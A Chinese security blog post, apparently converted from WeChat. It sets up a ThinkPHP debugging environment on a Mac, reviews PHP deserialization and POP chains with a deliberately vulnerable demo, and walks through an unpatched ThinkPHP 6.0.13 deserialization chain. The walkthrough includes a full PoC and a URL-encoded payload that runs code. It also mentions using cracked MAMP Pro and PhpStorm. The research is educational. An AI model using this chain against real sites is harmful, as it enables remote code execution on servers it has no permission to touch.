<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jO05JzS-XQ3OFVRVDwR-Wg)

0x01 ThinkPHP 版本梳理
==================

截止到 2022 年 10 月 17 日  
6.0.x 系列最新版是 V6.0.13（2022 年 07 月 15 日发布）  
5.1.x 系列最新版是 V5.1.41（2021 年 01 月 12 日发布）  
5.0.x 系列最新版是 V5.0.24（2019 年 01 月 11 日发布）

作者在 2019 年 02 月 14 日发布 V5.2 RC1 后，没有再发布过 V5.2 系列，而是在 2019 年 04 月 22 日发布 V6.0.0 RC2，看样子 V6.0 系列接替了 V5.2 系列

thinkphp6 及以上，安装需要使用 composer

0x02 Mac 下 PHP 集成环境踩坑
=====================

php 集成环境，之前在 windows 下用 phpstudy，自从换了 mac，什么都要重新来。。

首选使用破解版 MAMP Pro，但我这边下载后安装报错（后经查阅，安装破解版 MAMP Pro 可能需要关闭 SIP，SIP 即 macOS 的一种保护机制），不想关闭 SIP，放弃这个方案，也试过 MAMP 免费版，但不支持切换 php 版本，这个不能忍，尝试 phpstudy mac 版，发现 phpstudy mac 版支持切换 php 版本，其他功能界面也和 phpstudy windows 版基本一致，就用它了

具体使用 phpstudy mac 版后发现，启动 phpstudy mac 版内置的 php 解释器报错，提示找不到 redis.so 库，在 php.ini 中注释掉 redis.so 库可解决此提醒，but，使用 phpstudy 内置的 php 下载 composer 时又报错，提示缺少 openssl 库，此时需要自己编译 openssl 库，太麻烦了，干脆换一个 php 集成环境吧，找来找去，发现 MAMP 免费版也可以切换 php 版本（需要一个小技巧，后面会提到），下载后尝试用内置的 php 下载安装 composer，成功安装 composer，OK，就用它了

mamp 免费版切换 php 版本技巧，进入 mamp 下 php 安装目录，由于 mamp 默认会不显示后面加_x 的版本，所以可将其他版本改个名字来切换版本，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRUqfwq2pYzrpobnzcU6vr8SVtq0KZhU1rln2EVOxwrFodVKoCYjJSnw/640?wx_fmt=png&from=appmsg)

0x03 Mac 下 ThinkPHP 调试环境踩坑
==========================

php 开发环境，使用 phpstorm 2021.1.4，破解方式参考：https://github.com/ybdt/pentest-hub/tree/main / 如何放心的白嫖四大主流语言 IDE

安装 composer，参考：https://getcomposer.org/download/

在 mamp 的对应 php 目录下安装 composer，然后创建到 / usr/local/bin 的软连接，创建软连接后，可从任意位置执行 composer 及 php

```
ln -s /Applications/MAMP/bin/php/php7.1.33/bin/composer.phar /usr/local/bin/composer
ln -s /Applications/MAMP/bin/php/php7.1.33/bin/php /usr/local/bin/php

```

安装指定版本的 thinkphp 框架

```
composer create-project topthink/think tp5.0 5.0.24

```

我这边 composer 版本是 2.2.18，不是最新版 2.4.3，想使用 composer 安装 thinkphp6 的最新版 6.0.13 会提示找不到，可是 php7.1 安装 composer 最高版本只能是 2.2.18，于是改用 php7.4 安装 composer，成功安装到 composer 2.4.3，再用 composer 2.4.3 安装 thinkphp 6.0.13，成功安装，真是一波三折，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRgvIgqrDpVQ3v05HB0VPiavmhh48hc3ZMzmUt3CvQ7dT0QKEDLlYtoKw/640?wx_fmt=png&from=appmsg)

然后是 php 调试环境，mac 下想安装 xdebug 需要先通过 homebrew 安装 php，然后通过 pecl 安装 xdebug，可是这样只能安装 php 版本对应的 xdebug，不能安装指定版本的 xdebug，有点烦~

可从 https://xdebug.org/wizard 中查询当前 php 版本需要哪个版本的 xdebug，结果按照指令安装的时候，发现缺少 phpize，官方文档并没有讲述 mac 下缺少 phpize 该如何安装，google 后发现可能需要编译安装，太麻烦了，想想别的办法，猛地发现，mamp 的如下目录自带了编译好的 xdebug

```
/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902

```

不得不说，集成环境真香~

修改 php.ini，增加如下

```
[xdebug]
zend_extension="/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so"
xdebug.remote_enable=1
xdebug.remote_autostart=on
xdebug.remote_log="/var/log/xdebug.log"
xdebug.remote_port=9000
xdebug.remote_handler="dbgp"
xdebug.idekey="PhpStorm"

```

成功安装了 xdebug，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRomRuOvNvkYicnTibDAX2Zia4raqnuBwYL84kzcqFPMP7DKzQ29Zcr4VTQ/640?wx_fmt=png&from=appmsg)

Phpstorm 配置过程参见：https://juejin.cn/post/6934614190548221960

配置好后，如下图启动

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRBTLLt4PJtBLtaicqrxej8Iia6RkfSTPWmNCV2bnrzNic7suXz1BZaviaBw/640?wx_fmt=png&from=appmsg)

能看到网页访问停在了断点处

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibReAAn3EkjJKzRQeibWV7oqmUg8131XITOJoD5Mliaf26CKHh2ibHGciaKyg/640?wx_fmt=png&from=appmsg)

程序执行停在了断点处

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibR24o24rfpL2jic5ulm3DDNUDm3mpzqjOjptgJUprKiciaT47tPBebaFQicA/640?wx_fmt=png&from=appmsg)

0x04 PHP 反序列化漏洞及 POP 链复习
========================

PHP 反序列化漏洞原理：服务端在处理用户传入的序列化数据时，需要调用 unserialize()，php 中调用 unserialize() 会触发魔法方法`__wakekup()`、`__destruct()`，如果魔法方法中包含了危险函数或间接包含危险函数，则攻击者可构造恶意的序列化数据，在服务端反序列化的时候造成危险函数的执行，

PHP 反序列化 POP 链原理：由于类反序列化后只包含属性不包含方法，也就是说我们构造的序列化数据只能操纵类的属性，不能操纵方法，只能通过自动调用魔法方法来调用方法，这个时候如果魔法方法中不是直接包含危险函数，就需要向上回溯，一层一层跟踪，也就是所谓的 POP 链，通常是寻找包含危险函数的同名方法、或者更复杂的，触发各种魔法方法，最终调用危险函数

详细讲解可参考：  
https://johnfrod.top / 安全 / php 反序列化漏洞总结 /  
https://www.cnblogs.com/bmjoker/p/13742666.html

如下是一个存在反序列化漏洞的文件 vuln1.php

```
class Demo {
    var $test;
    function __construct() {
        $this->test = new L();
    }
    function __destruct() {
        $this->test->action();
    }
}
class L {
    function action() {
        echo "function action() in class L";
    }
}
class Evil {
    var $test2;
    function action() {
        eval($this->test2);
    }
}
unserialize($_GET['test']);

```

由上述 Demo 可知，如果构造一个 Demo 类，里面实例化的是类 Evil，反序列化时自动调用`__destruct()`，`__destruct()`中调用 action()，action() 中调用危险函数 eval，则最终导致代码执行，同时不要忘记将恶意代码赋值给 $test2，payload 如下

```
class Demo {
    var $test;
    function __construct() {
        $this->test = new Evil();
        $this->test->test2 = "phpinfo();";
    }
    function __destruct() {
        $this->test->action();
    }
}
class Evil {
    var $test2;
    function action(){
        eval($this->test2);
    }
}
$d = new demo();
$data = serialize($d);
echo $data;
//上述输出
//O:4:"Demo":1:{s:4:"test";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";\}\}

```

将上述序列化的输出传给 vuln1.php，执行结果如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRPrpgUT3tY1voXUuUTZkTw8ic3ldLZicd7JTAh34R6GeHFYlibx4CDtCog/640?wx_fmt=png&from=appmsg)

0x05 ThinkPHP 框架复习
==================

网站搭建好后，我们会访问：http://localhost:8888/tp6.0.13/public/index.php，其实这里的 index.php 并不是访问的内容，而是一个类似路由的文件，会请求分发到 app/controller/Index.php 中的方法 index，可以看到其内容也是首页中出现的内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRCcIQMhQaJzibbnq54s843ZfW4IeV5L8bbibjgozuVkuDQkPliaaPW99Ig/640?wx_fmt=png&from=appmsg)

我们对方法 index 做个修改

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRRA7bdTMm584H5KkfOJOgm2sakPoNe4wiaPlCAYdzBzdCciaZjo4InKvg/640?wx_fmt=png&from=appmsg)

可以看到，首页内容也发生了修改

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRC6JVBBjI5aoVOSAptowd1y60qoicIbV96LRWo3mPgQvUB74LVDQfQJQ/640?wx_fmt=png&from=appmsg)

其实访问 http://localhost:8888/tp6.0.13/public/index.php 相当于访问 http://localhost:8888/tp6.0.13/public/index.php/Index/index ，只不过不加的时候，类 Index 和方法 index 是作为默认值，如果要访问其他方法，改为其他方法即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRr5l9DsZYX91HUtMdK3NDk1cVtIxk1iaicAQZszxTaLvvT5ziclwnHQOtQ/640?wx_fmt=png&from=appmsg)

详细讲解可参考：  
https://www.kancloud.cn/manual/thinkphp6_0/1037485  
https://www.kancloud.cn/manual/thinkphp6_0/1037494

0x06 ThinkPHP 最新版 6.0.13 0day 利用链分析
===================================

截止到 2022 年 10 月 17 日，thinkphp 6.0.x 系列最新版是 V6.0.13（2022 年 07 月 15 日发布），08 月 14 日有人提交了一个反序列化利用链，是一个目前尚未修复的 0day，下面对它进行一波分析

先用如下 poc 打一遍

```
namespace League\Flysystem\Cached\Storage{
    class Psr6Cache{
          private $pool;
          protected $autosave = false;
          public function __construct($exp)
{
              $this->pool = $exp;
          }
    }
}
namespace think\log{
      class Channel{
          protected $logger;
          protected $lazy = true;
          public function __construct($exp)
{
               $this->logger = $exp;
               $this->lazy = false;
          }
}
}
namespace think{
      class Request{
          protected $url;
          public function __construct()
{
              $this->url = '<?php phpinfo(); ?>';
          }
      }
      class App{
            protected $instances = [];
            public function __construct()
{
                $this->instances = ['think\Request'=>new Request()];
            }
       }
}
namespace think\view\driver{
      class Php{}
}
namespace think\log\driver{
      class Socket{
            protected $config = [];
            protected $app;
            protected $clientArg = [];
            public function __construct()
            {
               $this->config = [
                  'debug'=>true,
                  'force_client_ids' => 1,
                  'allow_client_ids' => '',
                  'format_head' => [new \think\view\driver\Php,'display'], # 利用类和方法
               ];
               $this->app = new \think\App();
               $this->clientArg = ['tabid'=>'1'];
            }
       }
}
namespace{
    $c = new think\log\driver\Socket();
    $b = new think\log\Channel($c);
    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
    echo urlencode(serialize($a));
}
//输出如下
O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A2%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A17%3A%22think%5Clog%5CChannel%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00logger%22%3BO%3A23%3A%22think%5Clog%5Cdriver%5CSocket%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A4%3A%7Bs%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A16%3A%22force_client_ids%22%3Bi%3A1%3Bs%3A16%3A%22allow_client_ids%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22format_head%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A9%3A%22think%5CApp%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A13%3A%22think%5CRequest%22%3BO%3A13%3A%22think%5CRequest%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00clientArg%22%3Ba%3A1%3A%7Bs%3A5%3A%22tabid%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A0%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3B%7D

```

传入 payload，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRXdAFOUlicYW6LicGAfUnic2e2qgKSMB25iby6hMx9d18cSQRMyWIibve2kA/640?wx_fmt=png&from=appmsg)

根据 poc 可以看到漏洞代码出现在

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRCqm7libyOHnO7A1n0ZGyoRfVDl1yR1qTbpCY21tMLyIvsIXxBkjUSdw/640?wx_fmt=png&from=appmsg)

这种框架向上回溯太麻烦了，采用 poc + 动态 debug 进行分析，基于之前的 thinkphp 框架复习，我们在 vuln 方法中加入漏洞代码，并在反序列化处打上断点，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRnBfaEJ9yoQWsCcwdwqHnfdaVTYcmwD4pia0N6mo3W1xXNdB6qvDjMSQ/640?wx_fmt=png&from=appmsg)

此处是反序列化入口__destruct()，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRnTSLukkZyFRFrLslWZDEyyyp5JCv2qzCX2bDQHQy0PsGZfBtyRaSUQ/640?wx_fmt=png&from=appmsg)

一步一步跟进，跟进到下图所示的语句，可以看到此时 autosave 值为 false，进入 save()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibR0rYFFYOmpzTia7UsGq4QvIsYalpMgZlicA5cD4nFyvweibvTTbKfdNibsA/640?wx_fmt=png&from=appmsg)

继续跟踪，最终跟到触达代码执行的地方

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlZUaoEK3II9PFY8RMaRlSibRI8Y57ujSlB15xZ2arlWoq8BicaLpyibE6dKy9xvI7MbDOXHQlGicT3wfQ/640?wx_fmt=png&from=appmsg)